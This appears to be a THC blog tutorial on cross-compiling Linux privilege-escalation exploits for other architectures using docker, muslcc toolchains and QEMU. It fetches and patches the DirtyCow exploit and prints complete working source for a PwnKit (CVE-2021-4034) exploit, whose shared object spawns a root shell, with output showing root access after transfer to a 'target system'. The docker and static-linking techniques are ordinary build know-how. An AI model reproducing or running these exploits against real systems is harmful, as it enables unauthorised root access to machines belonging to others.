
**TL;DR**: Use docker with the [muslcc toolchain](https://hub.docker.com/r/muslcc/x86_64/tags) and _gcc -static_.

It is not always possible to compile an exploit on the target system. Here at THC we use various methods to cross-compile static Linux binaries. I'll explain some of our methods in this article.

Let's compile the exploit for [CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195) to run on Raspberry PI Linux (armv6l) while our workstation is MacOS (x86_64).

The vulnerability is a local privilege escalation in Linux Kernel <4.8.3.

# Static Compiling

## Using muslcc toolchain

The musl libc is a C standard library just like GNU's libc. It's smaller, cleaner and easier to handle.

The fine folks at https://musl.cc/ maintain cross-compiler toolchains against libmusl for many different architectures.

These toolchains can be used to generate a (static) Linux binary for a different architecture (e.g. arm6v or aarch64) than the architecture used for compiling the exploit (x86_64).

Additionally they have docker images: This allows us to compile binaries for different Operating Systems than our own Operating System (OS).

Summary: Docker + muslcc is architecture _and_ OS agnostic.

Firstly, there is a bug in the reference exploit. Let's fix this first:
```shell
mkdir thc; cd thc
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
sed  -i 'sX.*= copy_file.*Xint ret = system("cp /etc/passwd /tmp/passwd.bak");X' dirty.c
```

Next: Compile dirt.c for Linux for armv6 architecture on our MacOS (x84_64):
```shell
docker run --rm -v $(pwd):/src -w /src muslcc/x86_64:armv6-linux-musleabi sh -c "gcc -pthread dirty.c -o dirty-exp -lcrypt -static"
```

The newly created `./dirty-exp` binary will execute on a Raspberry Pi Linux (armv6l).

## Musl Cross Compiling for 5 architectures

Let's script this and compile for 5 different architectures:
```shell
for arch in aarch64-linux-musl armv6-linux-musleabi mips-linux-muslsf mips64-linux-musl x86_64-linux-musl; do
   docker run --rm -v $(pwd):/src -w /src muslcc/x86_64:${arch} sh -c "gcc -pthread dirty.c -o dirty-exp.${arch} -lcrypt -static"
done
```

Most architectures are _downward compatible_. This means an exploit compiled for arm6 will run fine on arm7 metal. Equally an exploit compiled for i386 (from the 90s) will run fine on x86_64 metal, albeit slow.

```console
$ ls -al dirty-exp.*
-rwxr-xr-x 1 0 0 170664 Aug 30 14:06 dirty-exp.aarch64-linux-musl
-rwxr-xr-x 1 0 0 119280 Aug 30 14:06 dirty-exp.armv6-linux-musleabi
-rwxr-xr-x 1 0 0 210384 Aug 30 14:06 dirty-exp.mips64-linux-musl
-rwxr-xr-x 1 0 0 210692 Aug 30 14:06 dirty-exp.mips-linux-muslsf
-rwxr-xr-x 1 0 0  88312 Aug 30 14:06 dirty-exp.x86_64-linux-musl
```

All binaries are static binaries. They run on any Linux system regardless of the distribution or Linux flavour (as long as the architecture matches).

## Statically compiling with other libraries

Some exploits need additional libraries to compile or have more complex compilation instructions. Let's pick the OpenSSL library as a worst case scenario: A huge and complex library. We use the dirt.c source again even that it does not depend on or need OpenSSL.

Let's start an interactive (_-it_) muslcc docker shell, download and compile OpenSSL and then compile the exploit for ARM6:

```shell
docker run --rm -v $(pwd):/src -w /src -it muslcc/x86_64:armv6-linux-musleabi
apk update \
&& apk add --no-cache bash perl make curl \
&& rm -rf /var/cache/apk/* \
&& curl https://www.openssl.org/source/openssl-1.1.1k.tar.gz | tar -xz \
&& mkdir usr \
&& cd openssl-1.1.1k \
&& ./Configure --prefix=/src/usr no-tests no-dso no-threads no-shared linux-generic64 \
&& make install_sw \
&& cd .. \
&& gcc -I/src/usr/include -L/src/usr/lib -pthread dirty.c -o dirty-exp -lcrypt -lcrypto -lssl -static
```

# Non-Static compiling

## Exploits that can not be static

Some exploits can not be compiled statically.

For example: Exploits that are shared object .so files and which the vulnerable program needs to load during runtime. It is not possible to cross-compile them: The .so files heavily depend on the Application Binary Interface (ABI) of the target system.

The ABI is the reason why you can not just execute a (dynamic) binary from a libmusl system on a libc system or vice versa.

These exploits need to be compiled on the matching OS with matching architecture. In our example we try to compile an exploit that needs a shared library (and thus can not be statically compiled) for aarch64 (aka arm64v8) to run on Amazon Linux 2 (which is based on Centos7 OS). 


There are a few methods to pick from:
1. Use an Amazon Linux 2/aarch64 instance.
1. Find a server of the same architecture and use Docker to run Centos7.
1. Use QEMU and Docker to run any OS of any architecture.

### Method 1 - Using Amazon Linux 2/aarch64

AWS has a good selection of Linux flavours (Ubuntu, Red Hat, SuSE and Debian) that can run on either x86_64 or aarch64/ARM64 architecture. It is free to run a t2.nano on aarch64 and running Amazon Linux 2.

### Method 2 - Use any aarch64 with Docker running Centos7

Let's assume Method 1 is not available.

Pick any server that runs on aarch64. Start a Docker image matching the target's OS. In this example I'm on a aarch64 server running Debian but my exploit needs to be compiled for Centos (Amazon Linux 2) also on aarch64.

```console
$ uname -m
aarch64
$ docker run --rm -v $(pwd):/src -it centos:centos7
[root@9409baa1861a /]# 
```

### Method 3 - QEMU and Docker


Docker can run images for [different architecture](https://github.com/multiarch/qemu-user-static). The execution is emulated by QEMU. The details are not noticeable to the user and 'docker just does it all for you'.

Firstly let's prepare Docker to run images of different architectures:
```console
$ docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
``` 

Then let's run an aarch64 image (aka arm64v8) on our x86_64 host:
```console
$ uname -m
x86_64
$ docker run --rm -it arm64v8/centos
[root@0a0888cd5ea7 /]# uname -m
aarch64
```

The executed binaries are automatically started via qemu. Let's check the host system:
```console
$ docker run --rm -t arm64v8/centos sleep 1337 &
[1] 4042135
$ ps axw | grep qemu 
4046761 pts/0    Ssl+   0:00 /usr/bin/qemu-aarch64-static /usr/bin/coreutils --coreutils-prog-shebang=sleep /usr/bin/sleep 1337
$ 
```

# Compiling [CVE-2021-4034] for Centos7/aarch64

[CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034/) (aka polkit/pkexec) is an exploit that can not be compiled statically. The exploit tricks the vulnerable program to load a dynamically shared object (.so file) during runtime. A dynamically shared object can never be static.

Any of the 3 methods above work. Our target is Amazon Linux 2 AMI on aarch64. The closest OS that's available on Docker is Centos7.

## Preparing the exploit

The [Proof-of-Concept exploit](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c) for CVE-2021-4034 needs to be modified slightly. At the moment the exploit executes gcc to compile the shared object during exploit execution. Our assumption is that gcc is not available on the target platform. 

We need to modify the original exploit in two ways:
1. Split it into two separate .c files.
1. Modify the source to copy the pre-compiled .so file instead of compiling it at runtime.

thc-polkit.c
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
	system("cp pwnkit.so pwnkit/pwnkit.so");
	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```

pwnkit.c
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
	setuid(0); setgid(0);
	seteuid(0); setegid(0);
	system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");
}
```

## Compiling

Any of the 3 methods discussed earlier can be used to compile the exploit. In this example I use QEMU & Docker:

```console
$ docker run --rm -v $(pwd):/src -w /src -it arm64v8/centos
[root@0a0888cd5ea7 src]# uname -m
aarch64
[root@0a0888cd5ea7 src]# yum group install "Development Tools"
...
[root@0a0888cd5ea7 src]# gcc --version
gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-44)
Copyright (C) 2015 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
[root@0a0888cd5ea7 src]#
```


Compile both source files:
```shell
gcc pwnkit.c -o pwnkit.so -shared -fPIC
gcc thc-polkit.c -o thc-polkit -static
```

Transfer `thc-polkit` and `pwnkit.so` to the target system and execute:
```console
$ ./thc-polkit
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

## Closing Notes

We also use VirtualBox. VirtualBox can be used to compile for different OSes but only for x86_64 or i386.

QEMU can be used for [much more](https://futurewei-cloud.github.io/ARM-Datacenter/qemu/how-to-launch-aarch64-vm/). 

